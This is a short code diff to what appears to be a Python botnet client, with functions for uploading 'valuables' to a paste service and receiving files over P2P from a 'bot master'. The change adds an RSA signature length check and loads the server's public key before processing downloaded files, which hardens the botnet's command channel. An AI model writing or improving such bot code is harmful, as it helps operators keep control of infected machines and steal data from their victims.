@@ -49,6 +49,8 @@ def upload_valuables_to_pastebot(fn):
 def verify_file(f, rsaKey):
     # Verify the file was sent by the bot master
     data = f
+    if(len(data) < 512):
+        return False
     signature = data[:512] # using 4096 bit RSA
     msg = data[512:] # rest of the message
     h = SHA.new()
@@ -84,7 +86,10 @@ def p2p_download_file(sconn):
     fn = str(sconn.recv(), "ascii")
     f = sconn.recv()
     print("Receiving %s via P2P" % fn)
-    process_file(fn, f)
+    fkey = open("serverPublic.pem", 'r')
+    rsaKey = RSA.importKey(fkey.read())
+    fkey.close()    
+    process_file(fn, f, rsaKey)
 
 ###
 
